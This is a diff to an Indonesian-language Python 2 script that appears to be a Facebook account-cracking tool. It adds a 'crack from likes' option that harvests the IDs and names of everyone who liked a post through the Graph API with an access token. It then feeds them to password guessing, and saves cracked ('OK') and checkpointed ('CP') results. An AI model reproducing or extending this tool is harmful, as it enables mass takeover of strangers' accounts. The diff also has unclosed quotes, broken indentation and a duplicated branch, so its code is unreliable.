@@ -139,7 +139,8 @@ def menu():
 	print" \033[0;97  #-----------------------------------#"
 	print" \033[0;97  1. crack from id publik"
 	print" \033[0;97  2. crack from followers"
-	print" \033[0;97  3. lihat hasil crack"
+	print" \033[0;97  3. crack from likes
+        print" \033[0;97  4. lihat hasil crack"
 	print" \033[0;97  0. remove token and cookies"
 	pilih_india()
 
@@ -181,7 +182,7 @@ def pilih_india():
 			na = i['name']
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
-	elif ask in["3","03"]:
+	elif ask in["4","04"]:
 		print"   1. lihat hasil ok"
 		print"   2. lihat hasil cp"
 		ress = raw_input("* pilih : ")
@@ -192,6 +193,10 @@ def pilih_india():
 			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
 			exit()
 		elif ress == "2" or ress == "02":
+			print (" [+] hasil \033[0;93mcp\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
+			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
+			exit()
+                elif ress == "3" or ress == "03:
 			print (" [+] hasil \033[0;93mcp\033[0;97m tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
 			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
 			exit()
@@ -263,6 +268,21 @@ def pilih_india():
 	p.map(main, id)
 	print(" \ncrack selesai...")
 	exit()
+
+def likes():
+    idt = raw_input(' [?] masukkan url atau id postingan : ')
+    if idt == "":
+    	menu()
+    ajg = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
+    ppk = json.loads(ajg.text)
+    for i in ppk['data']:
+        uid = i['id']
+        na = i['name']
+        nm = na.rsplit(' ')[0]
+        id.append(uid + '|' + nm)
+    print""
+    print' [+] total id -> \033[1;91m' + str(len(id))
+    pilihpw(ppk)
 
 def manual():
 	print("\033[0;97m *  masukan password contoh : bangladesh,102030,786786")
